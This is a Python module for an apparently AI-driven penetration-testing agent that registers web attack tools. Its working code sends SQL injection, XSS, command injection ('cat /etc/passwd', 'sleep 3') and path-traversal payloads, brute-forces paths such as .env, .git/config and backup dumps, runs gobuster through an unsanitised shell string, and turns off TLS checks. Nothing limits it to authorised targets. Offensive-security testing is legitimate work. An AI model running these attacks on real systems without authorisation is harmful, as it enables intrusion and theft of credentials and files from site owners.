"""Web Application Range Agent - Real web enumeration and attacks using httpx."""

import asyncio
import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Optional

import httpx

from ai.tool_registry import ToolCategory, register_tool, ToolParameter


class WebAttackType(str, Enum):
    """Types of web attacks."""

    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    CSRF = "csrf"
    COMMAND_INJECTION = "command_injection"
    FILE_INCLUSION = "file_inclusion"
    AUTHENTICATION_BYPASS = "authentication_bypass"
    AUTHORIZATION_BYPASS = "authorization_bypass"
    SESSION_HIJACKING = "session_hijacking"
    JWT_ATTACK = "jwt_attack"
    API_ABUSE = "api_abuse"


@dataclass
class WebEndpoint:
    """A discovered web endpoint."""

    url: str
    method: str = "GET"
    parameters: list[str] = None
    authentication_required: bool = False
    response_code: int = 200
    content_type: Optional[str] = None
    size: int = 0


@dataclass
class WebVulnerability:
    """A discovered web vulnerability."""

    endpoint: str
    vulnerability_type: WebAttackType
    parameter: Optional[str] = None
    evidence: Optional[str] = None
    severity: str = "medium"
    exploitable: bool = False


class WebAgent:
    """Web application enumeration and attack agent using real tools."""

    def __init__(self):
        self._endpoints: list[WebEndpoint] = []
        self._vulnerabilities: list[WebVulnerability] = []
        self._technology: dict[str, str] = {}

    async def enumerate_web(self, target: str, port: int = 443) -> dict:
        """Enumerate web application - headers, technology, cookies."""
        scheme = "https" if port == 443 else "http"
        base_url = f"{scheme}://{target}:{port}"
        results = {
            "technology": {},
            "endpoints": [],
            "forms": [],
            "cookies": [],
            "headers": {},
            "status": "unknown",
        }

        try:
            async with httpx.AsyncClient(verify=False, timeout=15, follow_redirects=True) as client:
                response = await client.get(base_url)

                # Parse response headers for technology
                headers = dict(response.headers)
                results["headers"] = headers
                results["status"] = response.status_code

                # Detect technology from headers
                server = headers.get("server", "").lower()
                powered_by = headers.get("x-powered-by", "").lower()

                if "apache" in server:
                    results["technology"]["server"] = "Apache"
                elif "nginx" in server:
                    results["technology"]["server"] = "Nginx"
                elif "iis" in server:
                    results["technology"]["server"] = "IIS"
                elif "cloudflare" in server:
                    results["technology"]["server"] = "Cloudflare"

                if "php" in powered_by:
                    results["technology"]["language"] = "PHP"
                elif "asp.net" in powered_by:
                    results["technology"]["language"] = "ASP.NET"
                elif "express" in powered_by:
                    results["technology"]["language"] = "Node.js"

                # Detect from response body
                body = response.text.lower()
                if "wp-content" in body or "wordpress" in body:
                    results["technology"]["cms"] = "WordPress"
                elif "joomla" in body:
                    results["technology"]["cms"] = "Joomla"
                elif "drupal" in body:
                    results["technology"]["cms"] = "Drupal"

                if "laravel" in body or "csrf-token" in body:
                    results["technology"]["framework"] = "Laravel"
                elif "react" in body or "reactroot" in body:
                    results["technology"]["framework"] = "React"
                elif "angular" in body or "ng-app" in body:
                    results["technology"]["framework"] = "Angular"
                elif "vue" in body or "vue-app" in body:
                    results["technology"]["framework"] = "Vue.js"

                # Extract cookies
                for cookie in response.cookies.items():
                    results["cookies"].append({"name": cookie[0], "value": cookie[1][:50]})

                # Extract forms
                form_pattern = r"<form[^>]*action=[\"']([^\"']*)[\"'][^>]*>(.*?)</form>"
                for match in re.finditer(form_pattern, response.text, re.DOTALL | re.IGNORECASE):
                    action = match.group(1)
                    form_content = match.group(2)
                    inputs = re.findall(r"<input[^>]*name=[\"']([^\"']*)[\"']", form_content)
                    results["forms"].append({"action": action, "inputs": inputs})

                # Extract links
                link_pattern = r"href=[\"']([^\"']*)[\"']"
                links = set()
                for match in re.finditer(link_pattern, response.text, re.IGNORECASE):
                    link = match.group(1)
                    if link.startswith("/") or target in link:
                        links.add(link)
                results["endpoints"] = list(links)[:50]

        except Exception as e:
            results["error"] = str(e)

        return results

    async def directory_discovery(self, target: str, port: int = 443) -> dict:
        """Discover directories and files on web server."""
        scheme = "https" if port == 443 else "http"
        base_url = f"{scheme}://{target}:{port}"

        # Extended wordlist for real penetration testing
        wordlist = [
            # Admin panels
            "admin", "admin/", "administrator", "wp-admin", "phpmyadmin",
            "cpanel", "webmail", "mail", "console", "manager",
            # Backup files
            "backup", "backup/", "backups", "db_backup", "www_backup",
            "backup.sql", "backup.tar.gz", "backup.zip", "dump.sql",
            ".backup", "old", "old/", "bak", "orig",
            # Config files
            "config", "config.php", "config.yml", "config.json",
            "settings.php", "settings.py", ".env", ".env.local",
            "wp-config.php", "web.config", "application.properties",
            # Source control
            ".git", ".git/", ".git/HEAD", ".git/config",
            ".svn", ".svn/entries", ".hg",
            # Common files
            "robots.txt", "sitemap.xml", "crossdomain.xml",
            "humans.txt", "security.txt", ".well-known/security.txt",
            # API endpoints
            "api", "api/", "api/v1", "api/v2", "graphql",
            "swagger", "swagger.json", "api-docs", "openapi.json",
            # Debug/Info
            "phpinfo.php", "info.php", "test.php", "debug",
            "server-status", "server-info",
            # Includes
            "includes", "lib", "vendor", "node_modules",
            # Upload directories
            "upload", "uploads", "files", "media", "images",
            # Logs
            "logs", "log", "access.log", "error.log",
            # Temporary
            "tmp", "temp", "cache", "test",
        ]

        found = []

        async with httpx.AsyncClient(verify=False, timeout=10, follow_redirects=False) as client:
            for path in wordlist:
                try:
                    url = f"{base_url}/{path}"
                    response = await client.get(url)
                    if response.status_code not in [404, 403, 500]:
                        found.append({
                            "path": path,
                            "status": response.status_code,
                            "size": len(response.content),
                            "redirect": str(response.headers.get("location", "")),
                        })
                except Exception:
                    continue

        # Also try directorybuster with gobuster-style
        try:
            cmd = f"gobuster dir -u {base_url} -w /usr/share/wordlists/dirb/common.txt -q -t 10 --no-error -s 200,301,302 2>/dev/null | head -30"
            proc = await asyncio.create_subprocess_shell(
                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=60)
            output = stdout.decode("utf-8", errors="replace")
            for line in output.split("\n"):
                if "(Status:" in line:
                    parts = line.split()
                    if parts:
                        gobuster_path = parts[0].strip("/")
                        if gobuster_path and not any(f["path"] == gobuster_path for f in found):
                            found.append({"path": gobuster_path, "status": 200, "size": 0, "source": "gobuster"})
        except Exception:
            pass

        return {
            "directories": [f for f in found if f["path"].endswith("/")],
            "files": [f for f in found if not f["path"].endswith("/")],
            "total_found": len(found),
        }

    async def test_injection(self, target: str, endpoint: str, parameter: str) -> dict:
        """Test for SQL injection vulnerabilities."""
        scheme = "https" if "443" in str(target) else "http"
        base_url = f"{scheme}://{target}"

        results = {"vulnerable": False, "type": "unknown", "evidence": "", "details": []}

        sql_payloads = [
            ("error_based", "'"),
            ("error_based", "1' OR '1'='1"),
            ("error_based", "1' AND '1'='1"),
            ("error_based", "1' UNION SELECT NULL--"),
            ("blind_true", "1' AND 1=1--"),
            ("blind_false", "1' AND 1=2--"),
            ("time_based", "1' AND SLEEP(3)--"),
            ("stacked", "1'; SELECT 1--"),
        ]

        error_patterns = [
            "sql", "mysql", "sqlite", "postgresql", "oracle",
            "ORA-", "syntax error", "unclosed quotation",
            "mysql_fetch", "pg_query", "sqlite3",
            "Microsoft OLE DB", "ODBC SQL Server",
            "warning:", "fatal error", "query failed",
        ]

        async with httpx.AsyncClient(verify=False, timeout=15) as client:
            for payload_type, payload in sql_payloads:
                try:
                    test_url = f"{base_url}/{endpoint}?{parameter}={payload}"
                    response = await client.get(test_url)
                    body = response.text.lower()

                    for pattern in error_patterns:
                        if pattern in body:
                            results["vulnerable"] = True
                            results["type"] = payload_type
                            results["evidence"] = f"SQL error pattern '{pattern}' found with payload '{payload}'"
                            results["details"].append({
                                "type": payload_type,
                                "payload": payload,
                                "error_pattern": pattern,
                                "status": response.status_code,
                            })
                            return results

                    # Check for time-based
                    if "sleep" in payload.lower() and response.elapsed.total_seconds() > 2.5:
                        results["vulnerable"] = True
                        results["type"] = "time_based"
                        results["evidence"] = f"Time-based SQLi: response took {response.elapsed.total_seconds()}s"
                        return results

                except Exception:
                    continue

        return results

    async def test_xss(self, target: str, endpoint: str, parameter: str) -> dict:
        """Test for XSS vulnerabilities."""
        scheme = "https" if "443" in str(target) else "http"
        base_url = f"{scheme}://{target}"

        results = {"vulnerable": False, "type": "unknown", "evidence": "", "payloads_reflected": []}

        xss_payloads = [
            ("<script>alert(1)</script>", "reflected_script"),
            ("<img src=x onerror=alert(1)>", "event_handler"),
            ("<svg onload=alert(1)>", "event_handler"),
            ("javascript:alert(1)", "javascript_uri"),
            ("<body onload=alert(1)>", "event_handler"),
            ('" onfocus=alert(1) autofocus="', "attribute_injection"),
            ("'><script>alert(1)</script>", "tag_injection"),
            ("<iframe src=javascript:alert(1)>", "iframe"),
            ("<input onfocus=alert(1) autofocus>", "event_handler"),
            ("<marquee onstart=alert(1)>", "event_handler"),
        ]

        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            for payload, xss_type in xss_payloads:
                try:
                    test_url = f"{base_url}/{endpoint}?{parameter}={payload}"
                    response = await client.get(test_url)

                    if payload in response.text:
                        results["vulnerable"] = True
                        results["type"] = xss_type
                        results["evidence"] = f"XSS payload reflected: {payload}"
                        results["payloads_reflected"].append(payload)
                        return results

                    # Check for partial reflection
                    partials = ["alert(1)", "onerror=", "onload=", "<script>"]
                    for partial in partials:
                        if partial in response.text and partial in payload:
                            results["payloads_reflected"].append(payload)

                except Exception:
                    continue

        if results["payloads_reflected"]:
            results["vulnerable"] = True
            results["type"] = "partial_reflection"

        return results

    async def test_command_injection(self, target: str, endpoint: str, parameter: str) -> dict:
        """Test for command injection vulnerabilities."""
        scheme = "https" if "443" in str(target) else "http"
        base_url = f"{scheme}://{target}"

        results = {"vulnerable": False, "evidence": "", "details": []}

        # Time-based detection
        try:
            async with httpx.AsyncClient(verify=False, timeout=20) as client:
                # Baseline timing
                import time
                start = time.time()
                await client.get(f"{base_url}/{endpoint}?{parameter}=test")
                baseline = time.time() - start

                # Test time-based injection
                time_payloads = ["test; sleep 3", "test|sleep 3", "test`sleep 3`", "test$(sleep 3)"]
                for payload in time_payloads:
                    start = time.time()
                    await client.get(f"{base_url}/{endpoint}?{parameter}={payload}")
                    elapsed = time.time() - start

                    if elapsed - baseline > 2.5:
                        results["vulnerable"] = True
                        results["evidence"] = f"Time-based command injection: {payload}"
                        results["details"].append({"type": "time_based", "payload": payload, "delay": elapsed})
                        return results
        except Exception:
            pass

        # Output-based detection
        output_payloads = [
            ("id", "uid="),
            ("whoami", "\n"),
            ("cat /etc/passwd", "root:"),
            ("echo PENAI_TEST", "PENAI_TEST"),
        ]

        try:
            async with httpx.AsyncClient(verify=False, timeout=10) as client:
                for payload, expected in output_payloads:
                    test_url = f"{base_url}/{endpoint}?{parameter}={payload}"
                    response = await client.get(test_url)
                    if expected in response.text:
                        results["vulnerable"] = True
                        results["evidence"] = f"Command output detected with payload: {payload}"
                        results["details"].append({"type": "output_based", "payload": payload, "output_match": expected})
                        return results
        except Exception:
            pass

        return results

    async def test_file_inclusion(self, target: str, endpoint: str, parameter: str) -> dict:
        """Test for Local/Remote File Inclusion."""
        scheme = "https" if "443" in str(target) else "http"
        base_url = f"{scheme}://{target}"

        results = {"vulnerable": False, "type": "unknown", "evidence": ""}

        lfi_payloads = [
            ("../../../../etc/passwd", "root:", "LFI"),
            ("../../../../etc/hostname", "hostname", "LFI"),
            ("../../../../proc/self/environ", "HOME=", "LFI"),
            ("../../../../proc/version", "Linux", "LFI"),
            ("....//....//....//etc/passwd", "root:", "LFI_bypass"),
            ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd", "root:", "LFI_encoded"),
            ("php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vd", "PHP_filter"),
            ("php://input", "", "PHP_input"),
        ]

        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            for payload, expected, lfi_type in lfi_payloads:
                try:
                    test_url = f"{base_url}/{endpoint}?{parameter}={payload}"
                    response = await client.get(test_url)
                    if expected in response.text:
                        results["vulnerable"] = True
                        results["type"] = lfi_type
                        results["evidence"] = f"LFI detected with {lfi_type}: /etc/passwd readable"
                        return results
                except Exception:
                    continue

        return results

    async def enumerate_api(self, target: str, port: int = 443) -> dict:
        """Enumerate API endpoints."""
        scheme = "https" if port == 443 else "http"
        base_url = f"{scheme}://{target}:{port}"

        results = {
            "endpoints": [],
            "methods": {},
            "authentication": {},
            "api_version": None,
            "documentation": [],
        }

        api_paths = [
            "/api", "/api/v1", "/api/v2", "/api/v3",
            "/graphql", "/swagger", "/swagger.json",
            "/api-docs", "/openapi.json", "/swagger-ui",
            "/api/swagger.json", "/api/docs",
            "/rest", "/rest/api",
            "/.well-known/openapi.yaml",
        ]

        try:
            async with httpx.AsyncClient(verify=False, timeout=10) as client:
                for path in api_paths:
                    try:
                        url = f"{base_url}{path}"
                        response = await client.get(url)

                        if response.status_code not in [404, 403, 500]:
                            endpoint_info = {
                                "path": path,
                                "status": response.status_code,
                                "content_type": response.headers.get("content-type", ""),
                                "size": len(response.content),
                            }

                            # Check if it's JSON (API response)
                            if "json" in response.headers.get("content-type", ""):
                                try:
                                    data = response.json()
                                    if isinstance(data, dict):
                                        endpoint_info["data_keys"] = list(data.keys())[:10]
                                    elif isinstance(data, list):
                                        endpoint_info["data_type"] = "array"
                                        endpoint_info["data_length"] = len(data)
                                except Exception:
                                    pass

                            results["endpoints"].append(endpoint_info)

                            # Try different HTTP methods
                            for method in ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"]:
                                try:
                                    resp = await client.request(method, url)
                                    if resp.status_code != 405:
                                        if path not in results["methods"]:
                                            results["methods"][path] = []
                                        results["methods"][path].append(method)
                                except Exception:
                                    pass

                    except Exception:
                        continue

        except Exception as e:
            results["error"] = str(e)

        return results

    async def analyze_jwt(self, token: str) -> dict:
        """Analyze JWT token for vulnerabilities."""
        import base64
        import json

        results = {
            "algorithm": "unknown",
            "claims": {},
            "vulnerabilities": [],
            "header": {},
        }

        try:
            parts = token.split(".")
            if len(parts) != 3:
                results["error"] = "Invalid JWT format"
                return results

            # Decode header
            header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_b64))
            results["header"] = header
            results["algorithm"] = header.get("alg", "unknown")

            # Decode payload
            payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
            claims = json.loads(base64.urlsafe_b64decode(payload_b64))
            results["claims"] = {k: v for k, v in claims.items() if k in [
                "sub", "iss", "exp", "iat", "aud", "role", "admin", "user", "name"
            ]}

            # Check vulnerabilities
            alg = header.get("alg", "")

            if alg == "none":
                results["vulnerabilities"].append({
                    "type": "alg_none",
                    "severity": "critical",
                    "description": "JWT uses 'none' algorithm - can be forged",
                })

            if alg in ["HS256", "HS384", "HS512"]:
                results["vulnerabilities"].append({
                    "type": "weak_secret",
                    "severity": "high",
                    "description": f"JWT uses symmetric algorithm {alg} - vulnerable to brute force",
                })

            if alg.startswith("RS") and "kid" in header:
                results["vulnerabilities"].append({
                    "type": "kid_injection",
                    "severity": "high",
                    "description": "JWT has 'kid' header - possible SQL injection or path traversal",
                })

            # Check expiration
            if "exp" in claims:
                import time
                if claims["exp"] < time.time():
                    results["vulnerabilities"].append({
                        "type": "expired",
                        "severity": "info",
                        "description": "JWT has expired",
                    })

            # Check for sensitive data in claims
            sensitive_keys = ["password", "secret", "key", "token", "ssn", "credit_card"]
            for key in claims:
                if any(s in key.lower() for s in sensitive_keys):
                    results["vulnerabilities"].append({
                        "type": "sensitive_data",
                        "severity": "high",
                        "description": f"Sensitive data '{key}' found in JWT claims",
                    })

        except Exception as e:
            results["error"] = str(e)

        return results

    def get_attack_surface(self) -> list[dict]:
        """Analyze web attack surface."""
        surface = []

        for endpoint in self._endpoints:
            if endpoint.parameters:
                surface.append({
                    "type": "input_validation",
                    "endpoint": endpoint.url,
                    "parameters": endpoint.parameters,
                    "risk": "medium",
                })

        for vuln in self._vulnerabilities:
            surface.append({
                "type": "vulnerability",
                "endpoint": vuln.endpoint,
                "vulnerability": vuln.vulnerability_type.value,
                "severity": vuln.severity,
            })

        return surface


# Register Web tools
@register_tool(
    name="web_enumerate",
    description="Enumerate web application - detect technology, headers, forms, cookies",
    category=ToolCategory.WEB,
    parameters=[
        ToolParameter(name="target", type="str", description="Target URL or IP"),
        ToolParameter(name="port", type="int", description="Port number", required=False, default=443),
    ],
)
async def web_enumerate(target: str, port: int = 443) -> dict:
    """Execute web enumeration."""
    agent = WebAgent()
    return await agent.enumerate_web(target, port)


@register_tool(
    name="web_dir_scan",
    description="Discover directories and files on web server",
    category=ToolCategory.WEB,
    parameters=[
        ToolParameter(name="target", type="str", description="Target URL or IP"),
        ToolParameter(name="port", type="int", description="Port number", required=False, default=443),
    ],
)
async def web_dir_scan(target: str, port: int = 443) -> dict:
    """Execute directory discovery."""
    agent = WebAgent()
    return await agent.directory_discovery(target, port)


@register_tool(
    name="web_sqli_test",
    description="Test for SQL injection vulnerabilities on a web endpoint",
    category=ToolCategory.WEB,
    parameters=[
        ToolParameter(name="target", type="str", description="Target URL or IP"),
        ToolParameter(name="endpoint", type="str", description="Endpoint path"),
        ToolParameter(name="parameter", type="str", description="Parameter to test"),
    ],
)
async def web_sqli_test(target: str, endpoint: str, parameter: str) -> dict:
    """Test for SQL injection."""
    agent = WebAgent()
    return await agent.test_injection(target, endpoint, parameter)


@register_tool(
    name="web_xss_test",
    description="Test for XSS vulnerabilities on a web endpoint",
    category=ToolCategory.WEB,
    parameters=[
        ToolParameter(name="target", type="str", description="Target URL or IP"),
        ToolParameter(name="endpoint", type="str", description="Endpoint path"),
        ToolParameter(name="parameter", type="str", description="Parameter to test"),
    ],
)
async def web_xss_test(target: str, endpoint: str, parameter: str) -> dict:
    """Test for XSS."""
    agent = WebAgent()
    return await agent.test_xss(target, endpoint, parameter)


@register_tool(
    name="web_cmdi_test",
    description="Test for command injection vulnerabilities",
    category=ToolCategory.WEB,
    parameters=[
        ToolParameter(name="target", type="str", description="Target URL or IP"),
        ToolParameter(name="endpoint", type="str", description="Endpoint path"),
        ToolParameter(name="parameter", type="str", description="Parameter to test"),
    ],
)
async def web_cmdi_test(target: str, endpoint: str, parameter: str) -> dict:
    """Test for command injection."""
    agent = WebAgent()
    return await agent.test_command_injection(target, endpoint, parameter)


@register_tool(
    name="web_lfi_test",
    description="Test for Local File Inclusion vulnerabilities",
    category=ToolCategory.WEB,
    parameters=[
        ToolParameter(name="target", type="str", description="Target URL or IP"),
        ToolParameter(name="endpoint", type="str", description="Endpoint path"),
        ToolParameter(name="parameter", type="str", description="Parameter to test"),
    ],
)
async def web_lfi_test(target: str, endpoint: str, parameter: str) -> dict:
    """Test for LFI."""
    agent = WebAgent()
    return await agent.test_file_inclusion(target, endpoint, parameter)


@register_tool(
    name="web_api_enum",
    description="Enumerate API endpoints and methods",
    category=ToolCategory.WEB,
    parameters=[
        ToolParameter(name="target", type="str", description="Target URL or IP"),
        ToolParameter(name="port", type="int", description="Port number", required=False, default=443),
    ],
)
async def web_api_enum(target: str, port: int = 443) -> dict:
    """Execute API enumeration."""
    agent = WebAgent()
    return await agent.enumerate_api(target, port)


@register_tool(
    name="web_jwt_analyze",
    description="Analyze a JWT token for vulnerabilities",
    category=ToolCategory.WEB,
    parameters=[
        ToolParameter(name="token", type="str", description="JWT token to analyze"),
    ],
)
async def web_jwt_analyze(token: str) -> dict:
    """Analyze JWT token."""
    agent = WebAgent()
    return await agent.analyze_jwt(token)
# ─────────────────────────────────────────────────────────────────────────────
# Bug-bounty depth tools (wired to exploitation.modules.web_vulns)
# ─────────────────────────────────────────────────────────────────────────────
@register_tool(
    name="web_graphql_test",
    description="Test GraphQL endpoints for introspection and injection",
    category=ToolCategory.WEB,
    parameters=[
        ToolParameter(name="target", type="str", description="Target URL or IP"),
        ToolParameter(name="port", type="int", description="Port number (default 443)", required=False, default=443),
    ],
)
async def web_graphql_test(target: str, port: int = 443) -> dict:
    """Test GraphQL injection."""
    from exploitation.modules.web_vulns import GraphQLInjectionTest

    module = GraphQLInjectionTest()
    result = await module.run(target, port)
    return {"success": result.success, "evidence": result.evidence, "output": result.output}


@register_tool(
    name="web_csrf_check",
    description="Check web forms for CSRF protections",
    category=ToolCategory.WEB,
    parameters=[
        ToolParameter(name="target", type="str", description="Target URL or IP"),
        ToolParameter(name="port", type="int", description="Port number", required=False, default=80),
    ],
)
async def web_csrf_check(target: str, port: int = 80) -> dict:
    """Detect CSRF weaknesses."""
    from exploitation.modules.web_vulns import CSRFDetectionTest

    module = CSRFDetectionTest()
    result = await module.run(target, port)
    return {"success": result.success, "evidence": result.evidence, "output": result.output}


@register_tool(
    name="web_upload_test",
    description="Probe file upload endpoints for weak restrictions",
    category=ToolCategory.WEB,
    parameters=[
        ToolParameter(name="target", type="str", description="Target URL or IP"),
        ToolParameter(name="port", type="int", description="Port number", required=False, default=80),
    ],
)
async def web_upload_test(target: str, port: int = 80) -> dict:
    """Test file upload restrictions."""
    from exploitation.modules.web_vulns import FileUploadTest

    module = FileUploadTest()
    result = await module.run(target, port)
    return {"success": result.success, "evidence": result.evidence, "output": result.output}


@register_tool(
    name="web_business_logic_test",
    description="Find endpoints to probe business-logic flaws",
    category=ToolCategory.WEB,
    parameters=[
        ToolParameter(name="target", type="str", description="Target URL or IP"),
        ToolParameter(name="port", type="int", description="Port number", required=False, default=80),
    ],
)
async def web_business_logic_test(target: str, port: int = 80) -> dict:
    """Hunt for business-logic surface."""
    from exploitation.modules.web_vulns import BusinessLogicTest

    module = BusinessLogicTest()
    result = await module.run(target, port)
    return {"success": result.success, "evidence": result.evidence, "output": result.output}


@register_tool(
    name="web_ssrf_test",
    description="Test URL parameters for SSRF",
    category=ToolCategory.WEB,
    parameters=[
        ToolParameter(name="target", type="str", description="Target URL or IP"),
        ToolParameter(name="port", type="int", description="Port number", required=False, default=80),
    ],
)
async def web_ssrf_test(target: str, port: int = 80) -> dict:
    """Detect SSRF."""
    from exploitation.modules.web_vulns import SSRFDetectionTest

    module = SSRFDetectionTest()
    result = await module.run(target, port)
    return {"success": result.success, "evidence": result.evidence, "output": result.output}


@register_tool(
    name="web_idor_test",
    description="Enumerate sequential object IDs for IDOR",
    category=ToolCategory.WEB,
    parameters=[
        ToolParameter(name="target", type="str", description="Target URL or IP"),
        ToolParameter(name="port", type="int", description="Port number", required=False, default=80),
    ],
)
async def web_idor_test(target: str, port: int = 80) -> dict:
    """Probe IDOR candidates."""
    from exploitation.modules.web_vulns import IDORTest

    module = IDORTest()
    result = await module.run(target, port)
    return {"success": result.success, "evidence": result.evidence, "output": result.output}


@register_tool(
    name="web_open_redirect_test",
    description="Test redirect parameters for open redirects",
    category=ToolCategory.WEB,
    parameters=[
        ToolParameter(name="target", type="str", description="Target URL or IP"),
        ToolParameter(name="port", type="int", description="Port number", required=False, default=80),
    ],
)
async def web_open_redirect_test(target: str, port: int = 80) -> dict:
    """Probe open redirects."""
    from exploitation.modules.web_vulns import OpenRedirectTest

    module = OpenRedirectTest()
    result = await module.run(target, port)
    return {"success": result.success, "evidence": result.evidence, "output": result.output}


@register_tool(
    name="web_ssti_test",
    description="Test parameters for server-side template injection",
    category=ToolCategory.WEB,
    parameters=[
        ToolParameter(name="target", type="str", description="Target URL or IP"),
        ToolParameter(name="port", type="int", description="Port number", required=False, default=80),
    ],
)
async def web_ssti_test(target: str, port: int = 80) -> dict:
    """Probe SSTI."""
    from exploitation.modules.web_vulns import SSTITest

    module = SSTITest()
    result = await module.run(target, port)
    return {"success": result.success, "evidence": result.evidence, "output": result.output}
